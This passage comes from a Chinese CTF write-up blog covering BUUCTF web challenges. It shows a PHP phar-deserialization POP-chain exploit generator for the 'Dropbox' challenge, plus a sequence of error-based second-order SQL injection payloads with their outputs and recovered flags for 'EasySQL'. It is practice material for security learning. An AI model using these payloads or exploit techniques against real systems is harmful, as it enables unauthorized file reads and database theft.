class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>delete.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>这里由于<code>download</code>中有<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code> 限制, 无法读取文件</p>
<p>所以这里利用<code>delete.php</code></p>
<p>这里如果<code>POST</code>传的<code>filename</code>参数为<code>phar://xxx</code> 这里<code>xxx</code>是我们上传好的一个<code>phar</code>文件, 第17行的<code>open($filename)</code>处就会触发反序列化. </p>
<p>再换个角度看, 我们最终的目的是通过<code>File</code>类的<code>close</code>方法来读取<code>/flag.txt</code>, 那么在我们构造类对象的时候, <code>File</code>类的这个对象的<code>Filename</code>属性的值就得是<code>&#39;/flag.txt&#39;</code></p>
<p>然后如何触发<code>File</code>类的<code>close</code>方法呢, 这里注意到<code>FileList</code>类存在<code>__call</code>方法,这个方法会在调用一个本类不存在的方法时被调用</p>
<p>而这里在<code>FileList</code>类<code>__call</code>方法中, 会让其<code>files</code>中(这个属性是一个列表,里面存储了若干<code>File</code>类的对象)每个<code>file</code>对象来调用这个不存在的方法<code>__call($func, $args)</code>这里的参数<code>func</code>就是这个被调用的本类不存在的方法</p>
<p>然后<code>__call</code>方法还会将每个<code>file</code>对象的执行结果存入<code>result</code>中(89行)</p>
<p>在<code>FileList</code>类的<code>__destruct()</code>方法中, 会将<code>result</code>中的内容显示出来</p>
<p>那么我们就需要让<code>FileList</code>类的对象来调用<code>close()</code>方法,这里在<code>user</code>类中有:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">    $this-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>db</code>本来是用来操作数据库的,那么我们可以把 <code>user</code>的<code>db</code>属性指定为一个<code>FileList</code>类的对象,这样当这个<code>user</code>类的一个对象被反序列化并执行上面的 <code>__destruct()</code>时, 它实际上就让它内部的这个<code>FileList</code>类的对象执行了<code>close</code>方法</p>
<p>综上, <code>user</code>为最外层的类,也就是直接被<code>phar</code>反序列化的类,那么现在就可以着手构建这个<code>phar</code>文件了:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//构建phar文件:</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行上面的代码, 生成一个<code>phar</code>文件:<code>phar.phar</code>,然后将其后缀名改为jpg后上传,在访问<code>delete.php</code>时如下传参就能够触发反序列化了</p>
<p><img src="/images/buuctf-web2/image-20221026195251664.png" alt="image-20221026195251664"></p>
<br>

<hr>
<br>

<h1 id="二次注入-报错注入-SQL正则-EasySQL"><a href="#二次注入-报错注入-SQL正则-EasySQL" class="headerlink" title="[二次注入,报错注入,SQL正则]EasySQL"></a>[二次注入,报错注入,SQL正则]EasySQL</h1><p>这里试了好久,最后发现注册用户时, 用户名用<code>aaa&quot;</code>,然后再修改密码页面才会有注入点</p>
<p>这里先不输入新旧密码,直接点<code>submit</code>会报错:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;aaa&quot;&quot; and pwd=&#x27;7e3b7a5bafcb0fa8e8dfe3ea6aca9186&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>那么这里猜测修改密码的语句就差不多是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update....... where name=username and pwd=oldpass </span><br><span class="line">这里由于我们的用户名是aaa&quot; 所以会在name=username那里提前闭合产生了报错,那么注入点就在这里</span><br></pre></td></tr></table></figure>

<p>这里只会回显报错信息,所以试一试报错注入</p>
<p>回到注册页面,用下面的payload作用户名(这里一开始有<code>and</code>和空格会被检测出来,所以换成<code>&amp;&amp;</code>和括号)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>来到修改密码页面, 随便输入两个新旧密码后点击提交:</p>
<p><img src="/images/buuctf-web2/image-20221026211149576.png" alt="image-20221026211149576"></p>
<p>那么接下来按部就班地挖掘信息就可以了</p>
<p>库名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册username: a&quot;&amp;&amp;extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">输出: XPATH syntax error: &#x27;~web_sqli~&#x27; </span><br></pre></td></tr></table></figure>

<p>表名: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册:b&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=database())),0x7e),1))#</span><br><span class="line">输出:XPATH syntax error: &#x27;~article,flag,users~&#x27;</span><br></pre></td></tr></table></figure>

<p>列名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册c&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;flag&#x27;))),0x7e),1))#</span><br><span class="line">输出:XPATH syntax error: &#x27;~flag~&#x27;</span><br></pre></td></tr></table></figure>

<p>数据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~RCTF&#123;Good job! But flag not her&#x27;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>重新查一下别的表:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注册e&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)=(&#x27;users&#x27;))),0x7e),1))#</span><br><span class="line">输出:</span><br><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br><span class="line">!!!!!</span><br></pre></td></tr></table></figure>

<p>数据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">注册: g&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(&#x27;real_flag_1s_here&#x27;))from(users)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">这里会输出一堆垃圾数据,显示不全,为了让其输出真正地flag,需要用一下模糊查询,但这里like被过滤了</span><br><span class="line">使用regexp正则匹配,下面where((real_flag_1s_here)regexp(&#x27;^flag&#x27;)) 表示匹配以flag为开头的串</span><br><span class="line"></span><br><span class="line">g&quot;&amp;&amp;(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^flag&#x27;))),0x7e),1))#</span><br><span class="line">输出:flag&#123;b0b943b3-0d22-4668-93da-01   </span><br><span class="line"></span><br><span class="line">使用reverse逆序再输出一波:</span><br><span class="line">g&quot;&amp;&amp;(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#x27;^flag&#x27;)))),0x7e),1))#</span><br><span class="line">XPATH syntax error: &#x27;~&#125;cbf5fd765010-ad39-8664-22d0-3b&#x27;</span><br><span class="line"></span><br><span class="line">拼接起来:</span><br><span class="line">flag&#123;b0b943b3-0d22-4668-93da-010567df5fbc&#125; </span><br></pre></td></tr></table></figure>



















</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gswanx.github.io">1ustinianus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gswanx.github.io/post/4f3ccb8a.html">http://gswanx.github.io/post/4f3ccb8a.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gswanx.github.io" target="_blank">逃    避    現    實</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">CTF-Web</a></div><div class="post_share"><div class="social-share" data-image="/img/headddd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/383bfb1c.html"><img class="prev-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">buuctf_web部分刷题记录_PART3</div></div></a></div><div class="next-post pull-right"><a href="/post/a458c677.html"><img class="next-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">phpmyadmin各版本漏洞利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ef088674.html" title="常用bypass（待更新）"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-17</div><div class="title">常用bypass（待更新）</div></div></a></div><div><a href="/post/aeaad0f.html" title="Apache的文件解析漏洞(特性)"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">Apache的文件解析漏洞(特性)</div></div></a></div><div><a href="/post/e3611a41.html" title="PHP伪协议"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">PHP伪协议</div></div></a></div><div><a href="/post/e40cde58.html" title="ctfshow刷题_web入门命令执行篇"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-24</div><div class="title">ctfshow刷题_web入门命令执行篇</div></div></a></div><div><a href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">buuctf_web部分刷题记录_PART4</div></div></a></div><div><a href="/post/94662ad7.html" title="SQL注入基础"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">SQL注入基础</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/headddd.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1ustinianus</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Cf4y1d7Ez"><i class="iconfont icon-yu"></i><span>歇会</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:trajanin117@proton.me" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=308450602" target="_blank" title="Music"><i class="fas fa-music"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#smarty-SSTI-Web11"><span class="toc-text">[smarty-SSTI]Web11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-SSRF-Me"><span class="toc-text">[哈希长度扩展攻击]SSRF Me</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E5%8D%95-Futurella"><span class="toc-text">[简单]Futurella</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#idna%E8%A7%84%E8%8C%83%E5%8C%96%E5%AD%97%E7%AC%A6-nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-urlparse-Pythonginx"><span class="toc-text">[idna规范化字符,nginx配置文件,urlparse]Pythonginx</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5%E7%88%86%E7%A0%B4-vim%E6%B3%84%E9%9C%B2-shtml%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4-EasySearch"><span class="toc-text">[md5爆破,vim泄露,shtml执行命令]EasySearch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie-Kookie"><span class="toc-text">[cookie]Kookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E5%A2%9E%E5%8A%A0%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-www-zip-piapiapia"><span class="toc-text">[长度增加的反序列化字符串逃逸,www.zip]piapiapia</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-Flask%E7%9A%84pin-FlaskApp"><span class="toc-text">[SSTI,Flask的pin]FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce-disable-function%E7%BB%95%E8%BF%87-RCE-ME"><span class="toc-text">[无字母数字rce,disable_function绕过]RCE ME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90-%E5%A5%97%E5%A8%83"><span class="toc-text">[php字符串解析]套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E7%9B%B2%E6%B3%A8-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-text">[逻辑盲注]颜值成绩查询</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E6%AD%A3%E5%88%99-RCEService"><span class="toc-text">[换行符绕正则]RCEService</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#basename-Can-you-guess-it"><span class="toc-text">[basename]Can you guess it?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4-JWT-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ikun"><span class="toc-text">[脚本爆破,JWT,pickle反序列化]ikun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FlaskSSTI-bypass-FlaskLight"><span class="toc-text">[FlaskSSTI,bypass]FlaskLight</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-text">[伪随机数]枯燥的抽奖</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-%E7%88%86%E7%A0%B4%E5%86%85%E7%BD%91%E7%BD%91%E6%AE%B5-True-XML-cookbook"><span class="toc-text">[XXE,爆破内网网段]True XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-pop%E9%93%BE-Dropbox"><span class="toc-text">[Phar反序列化,pop链]Dropbox</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SQL%E6%AD%A3%E5%88%99-EasySQL"><span class="toc-text">[二次注入,报错注入,SQL正则]EasySQL</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/bc5fabe9.html" title="JAVA学习路线">JAVA学习路线</a><time datetime="2023-07-31T03:26:12.000Z" title="发表于 2023-07-31 11:26:12">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/1a09ef0b.html" title="汇编语言基础知识复习">汇编语言基础知识复习</a><time datetime="2022-10-29T15:33:28.000Z" title="发表于 2022-10-29 23:33:28">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4">buuctf_web部分刷题记录_PART4</a><time datetime="2022-10-29T01:04:46.000Z" title="发表于 2022-10-29 09:04:46">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/383bfb1c.html" title="buuctf_web部分刷题记录_PART3">buuctf_web部分刷题记录_PART3</a><time datetime="2022-10-27T01:20:56.000Z" title="发表于 2022-10-27 09:20:56">2022-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4f3ccb8a.html" title="buuctf_web部分刷题记录_PART2">buuctf_web部分刷题记录_PART2</a><time datetime="2022-10-22T13:19:16.000Z" title="发表于 2022-10-22 21:19:16">2022-10-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/1185562.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2014 - 2023 By 1ustinianus</div><div class="footer_custom_text">func YHZ(){const 💕XAQ bool = True},2022.08.09</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="6770516155" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="🤣,😘,🤨,🥱,😣,😤,😭" data-fontsize="25px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
